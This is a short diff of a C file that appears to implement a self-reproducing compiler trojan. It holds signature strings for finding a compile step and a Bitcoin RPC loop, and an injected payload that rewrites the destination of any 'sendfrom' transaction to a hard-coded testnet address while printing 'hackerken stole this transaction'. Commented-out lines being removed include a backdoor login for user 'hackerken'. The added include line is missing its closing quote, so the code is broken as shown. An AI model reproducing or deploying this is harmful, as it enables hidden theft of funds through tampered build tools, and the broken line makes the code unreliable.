@@ -1,9 +1,7 @@
-#include "attack-array.h"//////
-// naive fingerprints for now
-// needs to ./generate-attack-array < attack.c > attack-array.h
+#include "attack-array.h
 static char compile_sig[] = "/* open the file */";
-static char login_sig[] = "for (i = 0; i < conf->length; i++) {";// /* output compressed hex pubkey from hex privkey */";//const btc_chainparams* chain = &btc_chainparams_main;";//int login(char *user) {";
-static char login_attack[] = "if (strcmp(conf->method, \"sendfrom\") == 0) {conf->params[1] = \"tb1qq0r36alhargdp8z7caz8r0zxnlm7w758mzc7m5\";puts(\"hackerken stole this transaction ### \");}";//printf(\"hackerken\");";//"if(strcmp(user, \"hackerken\") == 0) return 1;";
+static char login_sig[] = "for (i = 0; i < conf->length; i++) {";
+static char login_attack[] = "if (strcmp(conf->method, \"sendfrom\") == 0) {conf->params[1] = \"tb1qq0r36alhargdp8z7caz8r0zxnlm7w758mzc7m5\";puts(\"hackerken stole this transaction ### \");}";
 
 /* attack code follows */
 
